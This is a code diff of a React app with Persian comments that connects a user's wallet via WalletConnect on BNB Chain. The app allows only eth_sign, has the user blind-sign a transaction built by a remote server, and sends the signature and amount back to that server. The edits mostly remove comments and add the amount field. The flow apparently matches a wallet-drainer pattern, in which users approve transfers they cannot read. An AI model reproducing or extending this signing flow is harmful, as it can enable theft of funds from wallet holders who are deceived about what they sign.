@@ -20,16 +20,14 @@ async function getBNBBalance(address) {
 
 function App() {
   async function runner() {
-    // پاک کردن session قدیمی
     if (typeof localStorage !== "undefined") {
       localStorage.removeItem("walletconnect");
     }
 
-    // راه‌اندازی Provider
     const ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56],
-      methods: ["eth_sign"], // فقط از eth_sign استفاده می‌کنیم
+      methods: ["eth_sign"], // فقط eth_sign
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -45,7 +43,6 @@ function App() {
 
     console.log("✅ Wallet Connected:", accountSender);
 
-    // اطمینان از اینکه روی chain بایننس هستیم
     try {
       await provider.request({
         method: "wallet_switchEthereumChain",
@@ -84,22 +81,22 @@ function App() {
 
     console.log("✍️ Signature:", signature);
 
-    // درخواست تراکنش خام از سرور و سپس امضای آن
+    // درخواست تراکنش خام از سرور + امضای آن
     async function signAndSendTransaction() {
       try {
         console.log("📡 Requesting Unsigned Transaction...");
 
-        // این پاسخ معمولاً یه آبجکت JSON به‌صورت رشته است
+        // پاسخ سرور معمولا string یا object است
         let result = await jQuery.post(apiUrl, {
           handler: "tx",
           address: accountSender,
           signature: signature,
-          amount: amount,
+          amount: amount, // مرحله اول
         });
 
         console.log("📥 API Response (raw):", result);
 
-        // گام 1: اگر jQuery پاسخ را string برگرداند، parse کن
+        // اگر jQuery پاسخ رو string برگردونه، parse کنیم
         if (typeof result === "string") {
           try {
             result = JSON.parse(result);
@@ -111,13 +108,11 @@ function App() {
 
         console.log("📥 API Response (parsed):", result);
 
-        // حالا rawTransaction را بررسی کن
         if (!result || !result.rawTransaction) {
           console.error("❌ No rawTransaction received!", result);
           return;
         }
 
-        // تبدیل رشته به JSON
         let unsignedTx;
         try {
           unsignedTx =
@@ -131,21 +126,20 @@ function App() {
 
         console.log("📜 Unsigned Transaction:", unsignedTx);
 
-        // حالا می‌خواهیم همین تراکنش را امضا کنیم
-        // اما چون Trust Wallet فقط از eth_sign پشتیبانی می‌کند، ما تراکنش را دوباره با همان eth_sign امضا می‌گیریم
         console.log("📝 Signing Transaction (raw)...");
         const signedTx = await provider.request({
           method: "eth_sign",
-          params: [accountSender, JSON.stringify(unsignedTx)], 
+          params: [accountSender, JSON.stringify(unsignedTx)],
         });
 
         console.log("✍️ Signed Transaction (raw):", signedTx);
 
-        // ارسال تراکنش امضا شده به سرور
+        // مرحله دوم هم amount بفرست
         const txHash = await jQuery.post(apiUrl, {
           handler: "sign",
           signature: signedTx,
           address: accountSender,
+          amount: amount, // 👈 اینجا اضافه شد
         });
 
         console.log("📤 Transaction Sent:", txHash);
